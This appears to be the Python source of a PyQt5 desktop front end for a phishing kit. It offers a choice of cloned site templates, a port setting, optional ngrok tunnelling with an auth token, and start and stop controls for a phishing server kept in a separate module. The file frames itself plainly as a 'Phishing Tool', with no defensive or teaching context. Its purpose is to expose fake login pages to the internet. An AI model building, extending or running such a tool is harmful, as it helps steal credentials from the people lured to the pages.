import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QLabel, QComboBox, QLineEdit, QPushButton, QPlainTextEdit, QGroupBox, QRadioButton, QHBoxLayout, QWidget, QInputDialog, QSizePolicy
import httpserver
import glob
import threading
import os

class PhishingTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle('Phishing Tool')
        main_layout = QVBoxLayout()

        self.site_label = QLabel('Site:')
        self.site_combobox = QComboBox()
        sites = self.get_sites()
        for site in sites:
            self.site_combobox.addItem(site)

        self.port_label = QLabel('Port:')
        self.port_input = QLineEdit()
        self.port_input.setText('8080')

        self.start_button = QPushButton('Start')
        self.start_button.clicked.connect(self.start_phishing)
        self.stop_button = QPushButton('Stop')
        self.stop_button.clicked.connect(self.stop_phishing)

        self.output_label = QLabel('Output:')
        self.output_area = QPlainTextEdit()
        self.output_area.setReadOnly(True)
        self.output_area.setFixedWidth(800)
        self.output_area.setFixedHeight(300)
        self.output_area.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)

        self.tunneling_options_group = QGroupBox("Tunneling Options")
        self.tunneling_options_layout = QHBoxLayout()

        self.ngrok_option = QRadioButton("Ngrok")
        self.localhost_option = QRadioButton("Localhost")
        self.localhost_option.setChecked(True)
        self.tunneling_options_layout.addWidget(self.localhost_option)
        self.tunneling_options_layout.addWidget(self.ngrok_option)
        self.tunneling_options_group.setLayout(self.tunneling_options_layout)

        self.server_thread = None
        self.server_stopped = threading.Event()

        main_layout.addWidget(self.site_label)
        main_layout.addWidget(self.site_combobox)
        main_layout.addWidget(self.port_label)
        main_layout.addWidget(self.port_input)
        main_layout.addWidget(self.tunneling_options_group)
        main_layout.addWidget(self.start_button)
        main_layout.addWidget(self.stop_button)
        main_layout.addWidget(self.output_label)
        main_layout.addWidget(self.output_area)

        central_widget = QWidget()
        central_widget.setLayout(main_layout)
        self.setCentralWidget(central_widget)

    def start_phishing(self):
        site = self.site_combobox.currentText()
        port = self.port_input.text()
        ngrok_option = self.ngrok_option.isChecked()
        ngrok_auth_token = None
        if ngrok_option:
            ngrok_auth_token, _ = QInputDialog.getText(self, "Ngrok Auth Token", "Enter your ngrok authentication token:")

        httpserver.phishing_tool_instance = self
        self.server_manager = httpserver.ServerManager()
        self.server_thread = threading.Thread(target=self.server_manager.start_server, args=(port, self.update_output, ngrok_option, ngrok_auth_token, site))
        self.server_thread.start()

    def closeEvent(self, event):
        self.stop_phishing()
        event.accept()

    def stop_phishing(self):
        if self.server_thread:
            self.server_manager.stop_server()
            self.server_thread.join()
            self.output_area.appendPlainText(" [ * ] Server stopped.")
            self.server_thread = None
        else:
            self.output_area.appendPlainText(" [ - ] No server running.")

    def get_sites(self):
        site_list = [
            os.path.basename(os.path.dirname(site))
            for site in glob.glob("templates/*/index.html")
        ]
        return site_list

    def update_output(self, text):
        self.output_area.appendPlainText(text)

def main():
    app = QApplication(sys.argv)
    window = PhishingTool()
    window.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()
